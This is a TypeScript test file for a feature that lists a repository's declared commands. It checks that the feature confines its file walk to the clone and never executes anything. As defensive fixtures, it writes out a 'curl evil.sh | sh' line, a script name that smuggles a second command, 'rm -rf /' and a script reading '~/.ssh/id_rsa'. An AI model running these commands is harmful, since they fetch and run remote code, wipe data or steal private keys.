/**
 * The Onboarding Tour's declared-command layer — `commands.ts`, over the real
 * confined walk.
 *
 * Covers AC-20, AC-21, AC-22 of `specs/onboarding-generator.md`.
 *
 * Hermetic: every case builds a real temp directory and stands a fake
 * `clonePathFor` in front of it — the shape `test/project-context-walk.test.ts`
 * and `test/indexer-walk.test.ts` already use. The confinement under test is real
 * filesystem behaviour (`realpath`, a prefix check, `stat`), so a mocked
 * filesystem would assert nothing about it. No `.it.` in the filename: the two CI
 * workflows split the suite on exactly that substring (`DDG-TEST-001`).
 *
 * The confinement case comes in a PAIR — an escaping symlink omitted **and** an
 * in-clone symlink still found — because a walk that skipped every symlink would
 * pass the first alone for the wrong reason, and the defect would then surface
 * only the day an in-clone symlink stopped being read, with no test watching
 * (`server/INSIGHTS.md`, 2026-08-19).
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, mkdir, writeFile, symlink, readdir, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { ConfinedRepoDocReader } from '../src/adapters/git/confined-doc.js';
import { collectDeclaredCommands } from '../src/modules/onboarding/commands.js';
import { MAX_DECLARED_COMMANDS } from '../src/modules/onboarding/constants.js';
import type { OnboardingDocReader, OnboardingRepoRef } from '../src/modules/onboarding/types.js';

const REPO: OnboardingRepoRef = { owner: 'acme', name: 'payments-api' };

let root: string;
let docs: OnboardingDocReader;

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'onboarding-commands-'));
  docs = new ConfinedRepoDocReader({ clonePathFor: () => root });
});

afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

async function writeFileAt(rel: string, contents: string): Promise<void> {
  const full = join(root, rel);
  await mkdir(dirname(full), { recursive: true });
  await writeFile(full, contents);
}

const commandsOf = (rows: readonly { command: string }[]) => rows.map((row) => row.command);

describe('every command comes from a declared source (AC-20)', () => {
  it('takes the package.json script and never the README’s curl-pipe-sh line', async () => {
    // AC-20's own fixture: a README that suggests `curl … | sh` beside a
    // `package.json` that declares `dev`. Prose is never a command source,
    // because the screen puts a COPY BUTTON beside every command it shows.
    await writeFileAt(
      'README.md',
      ['# payments-api', '', 'Install with:', '', '```sh', 'curl https://evil.sh | sh', '```'].join(
        '\n',
      ),
    );
    await writeFileAt(
      'package.json',
      JSON.stringify({ name: 'payments-api', scripts: { dev: 'vite', build: 'tsc -p .' } }),
    );

    const found = await collectDeclaredCommands(docs, REPO);

    expect(commandsOf(found)).toEqual(['npm run dev', 'npm run build']);
    // Not merely "the README line is absent from the list": nothing derived from
    // the README appears in any command at all.
    expect(found.some((row) => row.command.includes('curl'))).toBe(false);
    expect(found.some((row) => row.file === 'README.md')).toBe(false);
  });

  it('reads Makefile targets and compose services, and nothing else in the tree', async () => {
    await writeFileAt(
      'Makefile',
      [
        '.PHONY: build test',
        'VERSION:=1.2.3',
        '',
        'build:',
        '\tgo build ./...',
        '',
        'test:',
        '\tgo test ./...',
        '',
        '%.o: %.c',
        '\tcc -c $<',
      ].join('\n'),
    );
    await writeFileAt(
      'docker-compose.yml',
      [
        'version: "3"',
        'services:',
        '  api:',
        '    image: acme/api',
        '  db:',
        '    image: postgres:16',
        'volumes:',
        '  pgdata:',
      ].join('\n'),
    );
    // Neither of these declares anything this feature reads.
    await writeFileAt('Dockerfile', 'RUN rm -rf /');
    await writeFileAt('scripts/deploy.sh', '#!/bin/sh\nrm -rf /\n');

    const found = await collectDeclaredCommands(docs, REPO);

    // Declaring path ascending, so two generations of an unchanged repository
    // produce the same list — `Makefile` before `docker-compose.yml` because the
    // sort is over the raw path and `M` sorts before `d`.
    expect(commandsOf(found)).toEqual([
      'make build',
      'make test',
      'docker compose -f docker-compose.yml up api',
      'docker compose -f docker-compose.yml up db',
    ]);
    // A recipe line, an assignment, `.PHONY` and a pattern rule are not targets;
    // `volumes:` ends the compose block rather than contributing a service.
    expect(commandsOf(found)).not.toContain('make .PHONY');
    expect(commandsOf(found)).not.toContain('make VERSION');
    expect(commandsOf(found)).not.toContain('docker compose -f docker-compose.yml up pgdata');
    expect(found.some((row) => row.file === 'Dockerfile')).toBe(false);
    expect(found.some((row) => row.file === 'scripts/deploy.sh')).toBe(false);
  });

  it('skips a script name that would smuggle a second shell command past the copy button', async () => {
    // A `package.json` key is repository content, so on any imported repository
    // it is attacker-controlled: `npm run dev; curl evil.sh | sh` is what a copy
    // button would otherwise hand to a shell.
    await writeFileAt(
      'package.json',
      JSON.stringify({ scripts: { 'dev; curl evil.sh | sh': 'vite', start: 'node .' } }),
    );

    const found = await collectDeclaredCommands(docs, REPO);

    expect(commandsOf(found)).toEqual(['npm run start']);
  });

  it('declares nothing for a repository that declares none of the three sources (EC-8)', async () => {
    await writeFileAt('main.go', 'package main');
    await writeFileAt('README.md', 'Run `go run ./...`');

    expect(await collectDeclaredCommands(docs, REPO)).toEqual([]);
  });
});

describe('every command names the file it was read from (AC-21)', () => {
  it('attributes each command to its declaring path, monorepo included (EC-7)', async () => {
    // EC-7: several `package.json` files declaring conflicting sets. The result
    // is several ATTRIBUTED sets, never one merged one — which is what lets a
    // reader check a command against its source before running it.
    await writeFileAt('package.json', JSON.stringify({ scripts: { dev: 'turbo dev' } }));
    await writeFileAt('apps/api/package.json', JSON.stringify({ scripts: { dev: 'tsx watch .' } }));
    await writeFileAt('apps/web/package.json', JSON.stringify({ scripts: { dev: 'next dev' } }));

    const found = await collectDeclaredCommands(docs, REPO);

    expect(found).toEqual([
      { command: 'npm run dev', file: 'apps/api/package.json', order: 0 },
      { command: 'npm run dev', file: 'apps/web/package.json', order: 1 },
      { command: 'npm run dev', file: 'package.json', order: 2 },
    ]);
    // Every row carries a declaring file, and every one of them exists.
    for (const row of found) {
      expect(row.file).not.toBe('');
      await expect(readFile(join(root, row.file), 'utf8')).resolves.toContain('scripts');
    }
  });

  it('names the invocation the repository’s own lockfile implies', async () => {
    await writeFileAt('package.json', JSON.stringify({ scripts: { dev: 'vite' } }));
    await writeFileAt('pnpm-lock.yaml', 'lockfileVersion: 9.0');

    const found = await collectDeclaredCommands(docs, REPO);

    expect(commandsOf(found)).toEqual(['pnpm run dev']);
    // The lockfile is a detection signal and never a command source: it is not
    // read, and it contributes no row.
    expect(found.some((row) => row.file === 'pnpm-lock.yaml')).toBe(false);
  });
});

describe('the walk is confined to the clone', () => {
  it('omits a package.json symlinked out of the clone', async () => {
    const outside = await mkdtemp(join(tmpdir(), 'onboarding-outside-'));
    try {
      await writeFile(
        join(outside, 'package.json'),
        JSON.stringify({ scripts: { 'exfiltrate-secrets': 'cat ~/.ssh/id_rsa' } }),
      );
      await writeFileAt('package.json', JSON.stringify({ scripts: { dev: 'vite' } }));
      await mkdir(join(root, 'tools'), { recursive: true });
      await symlink(join(outside, 'package.json'), join(root, 'tools', 'package.json'));

      const found = await collectDeclaredCommands(docs, REPO);

      expect(commandsOf(found)).toEqual(['npm run dev']);
      expect(found.some((row) => row.command.includes('exfiltrate-secrets'))).toBe(false);
    } finally {
      await rm(outside, { recursive: true, force: true });
    }
  });

  it('still finds a package.json symlinked WITHIN the clone', async () => {
    // The pair. Without this case, a `return false` at the top of the walk's
    // candidate test — or a blanket "skip every symlink" — passes the case above
    // for a reason that has nothing to do with confinement.
    await writeFileAt('config/package.json', JSON.stringify({ scripts: { lint: 'eslint .' } }));
    await mkdir(join(root, 'tools'), { recursive: true });
    await symlink(join(root, 'config', 'package.json'), join(root, 'tools', 'package.json'));

    const found = await collectDeclaredCommands(docs, REPO);

    expect(commandsOf(found)).toEqual(['npm run lint', 'npm run lint']);
    expect(found.map((row) => row.file)).toEqual([
      'config/package.json',
      'tools/package.json',
    ]);
  });

  it('descends into no excluded directory', async () => {
    await writeFileAt('package.json', JSON.stringify({ scripts: { dev: 'vite' } }));
    for (const dir of ['node_modules', 'dist', '.git', '.pnpm-store', 'vendor']) {
      await writeFileAt(`${dir}/p/package.json`, JSON.stringify({ scripts: { evil: 'x' } }));
    }

    const found = await collectDeclaredCommands(docs, REPO);

    expect(commandsOf(found)).toEqual(['npm run dev']);
  });

  it('caps the number of commands it reports', async () => {
    const scripts: Record<string, string> = {};
    for (let i = 0; i < MAX_DECLARED_COMMANDS + 20; i += 1) scripts[`task${i}`] = 'true';
    await writeFileAt('package.json', JSON.stringify({ scripts }));

    const found = await collectDeclaredCommands(docs, REPO);

    expect(found).toHaveLength(MAX_DECLARED_COMMANDS);
    // `order` is dense over what was actually kept, so a client rendering it
    // never shows a gap.
    expect(found.map((row) => row.order)).toEqual(
      Array.from({ length: MAX_DECLARED_COMMANDS }, (_, i) => i),
    );
  });

  it('yields nothing rather than throwing for a repository with no clone', async () => {
    const reader = new ConfinedRepoDocReader({ clonePathFor: () => join(root, 'no-such-clone') });
    await expect(collectDeclaredCommands(reader, REPO)).resolves.toEqual([]);
  });
});

describe('nothing this feature derives is ever executed (AC-22)', () => {
  it('reaches no process-spawning call anywhere in the module', async () => {
    // AC-22 is `Verify: analysis` in the spec, and this is that analysis made
    // mechanical: a command is a VALUE that travels to the client as a string,
    // so no file of the feature may reach a subprocess API. A behavioural
    // assertion cannot see this — a spawn added tomorrow on a path no fixture
    // exercises would leave every other test in this file green.
    const dir = new URL('../src/modules/onboarding/', import.meta.url);
    const names = await readdir(dir);
    expect(names.length).toBeGreaterThan(0);

    const offenders: string[] = [];
    for (const name of names) {
      const text = await readFile(new URL(name, dir), 'utf8');
      if (/child_process|\bexecFile\b|\bspawnSync\b|\bexecSync\b|\bspawn\(/.test(text)) {
        offenders.push(name);
      }
    }
    expect(offenders).toEqual([]);
  });

  it('returns commands as plain strings, with no callable among them', async () => {
    await writeFileAt('package.json', JSON.stringify({ scripts: { dev: 'vite' } }));

    const found = await collectDeclaredCommands(docs, REPO);

    expect(found.length).toBeGreaterThan(0);
    for (const row of found) {
      expect(typeof row.command).toBe('string');
      expect(typeof row.file).toBe('string');
    }
  });
});
